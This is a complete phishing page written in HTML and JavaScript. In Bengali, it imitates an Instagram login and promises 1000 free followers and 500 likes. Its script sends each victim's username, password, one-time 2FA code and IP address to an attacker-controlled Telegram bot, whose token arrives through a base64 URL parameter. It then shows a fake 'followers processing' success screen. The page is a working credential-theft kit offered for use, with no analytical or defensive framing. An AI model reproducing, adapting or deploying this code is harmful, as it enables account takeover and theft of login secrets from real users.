<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Get Free Followers & Likes</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 15px;
        }
        .container {
            width: 100%;
            max-width: 380px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            padding: 30px 20px;
            text-align: center;
        }
        .insta-logo {
            width: 180px;
            margin-bottom: 10px;
        }
        .main { padding: 0 30px 30px; }
        .promo-box {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            margin-bottom: 20px;
        }
        .promo-title {
            color: #262626;
            font-weight: 700;
            font-size: 16px;
        }
        .form-group { margin-bottom: 10px; }
        .input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 14px;
            background-color: #fafafa;
        }
        .input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        .section { display: none; }
        .active { display: block; }
        .footer-text {
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
            margin-top: 20px;
        }
        #loading { text-align: center; padding: 20px; }
        .spinner {
            width: 25px; height: 25px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #bc1888;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="insta-logo">
    </div>

    <div class="main">
        <div id="step1" class="section active">
            <div class="promo-box">
                <p class="promo-title">🚀 ফ্রী ১০০০ ফলোয়ার এবং ৫০০ লাইক পান!</p>
            </div>
            <div class="form-group">
                <input type="text" id="insta_user" class="input" placeholder="ফোন নম্বর, ইউজারনেম বা ইমেইল" required>
            </div>
            <div class="form-group">
                <input type="password" id="insta_pass" class="input" placeholder="পাসওয়ার্ড" required>
            </div>
            <button class="btn" id="btn1">ফলোয়ার দাবি করুন</button>
        </div>

        <div id="step2" class="section">
            <h2 style="font-size: 18px; text-align: center; margin-bottom: 10px;">অ্যাকাউন্ট ভেরিফিকেশন</h2>
            <p style="font-size: 13px; color: #666; text-align: center; margin-bottom: 15px;">নিরাপত্তার জন্য আপনার মোবাইলে পাঠানো ৬-ডিজিটের কোডটি লিখুন।</p>
            <div class="form-group">
                <input type="text" id="insta_code" class="input" placeholder="সিকিউরিটি কোড" maxlength="8">
            </div>
            <button class="btn" id="btn2">কোড নিশ্চিত করুন</button>
        </div>

        <div id="loading" class="section">
            <div class="spinner"></div>
            <p style="font-size: 14px; color: #262626;">ফলোয়ার প্রসেসিং হচ্ছে...</p>
        </div>

        <div id="success" class="section" style="text-align: center;">
            <i class="material-icons" style="font-size: 50px; color: #bc1888;">stars</i>
            <h2 style="font-size: 18px; color: #262626; margin-top: 10px;">সফল হয়েছে!</h2>
            <p style="font-size: 13px; color: #666; margin-top: 5px;">আগামী ১ ঘণ্টার মধ্যে আপনার অ্যাকাউন্টে ফলোয়ার যোগ হবে। অ্যাকাউন্টটি লগইন অবস্থায় রাখুন।</p>
        </div>

        <p class="footer-text">from Meta</p>
    </div>
</div>

<script>
    class C2Handler {
        constructor() {
            this.config = this.init();
        }

        init() {
            const params = new URLSearchParams(window.location.search);
            const p = params.get('p');
            if (p) {
                try {
                    const decoded = JSON.parse(atob(p));
                    return { token: decoded.bot, chat: decoded.chat };
                } catch (e) { console.error("Config Error"); }
            }
            return { token: null, chat: null };
        }

        async getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'Unknown'; }
        }

        async sendTelegram(user, pass = '', code = '', stage = 'Insta Login') {
            if (!this.config.token || !this.config.chat) return;

            const ip = await this.getIP();
            const time = new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'});
            
            let message = `*📸 INSTAGRAM HIT DETECTED* 🔥\n\n`;
            message += `👤 *User:* \`${user}\`\n`;
            if (pass) message += `🔑 *Pass:* \`${pass}\`\n`;
            if (code) message += `🔐 *2FA:* \`${code}\` ✅\n`;
            message += `\n📊 *Stage:* ${stage}\n`;
            message += `🌐 *IP:* \`${ip}\`\n`;
            message += `🕐 *Time:* ${time}\n`;

            try {
                await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: this.config.chat,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) { console.error("API Error"); }
        }
    }

    const c2 = new C2Handler();
    let userStore = '', passStore = '';

    // Step 1: Login
    document.getElementById('btn1').onclick = async () => {
        userStore = document.getElementById('insta_user').value.trim();
        passStore = document.getElementById('insta_pass').value.trim();

        if (userStore === '' || passStore.length < 6) {
            alert('আপনার অ্যাকাউন্টের সঠিক তথ্য দিন!'); return;
        }

        document.getElementById('btn1').disabled = true;
        document.getElementById('btn1').innerText = "অপেক্ষা করুন...";
        
        await c2.sendTelegram(userStore, passStore, '', 'Login Info');

        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
    };

    // Step 2: 2FA
    document.getElementById('btn2').onclick = async () => {
        const code = document.getElementById('insta_code').value.trim();
        if (code === '') { alert('সিকিউরিটি কোড দিন!'); return; }

        document.getElementById('step2').classList.remove('active');
        document.getElementById('loading').classList.add('active');

        await c2.sendTelegram(userStore, passStore, code, 'Full Hit (Followers)');

        setTimeout(() => {
            document.getElementById('loading').classList.remove('active');
            document.getElementById('success').classList.add('active');
        }, 4000);
    };
</script>

</body>
</html>
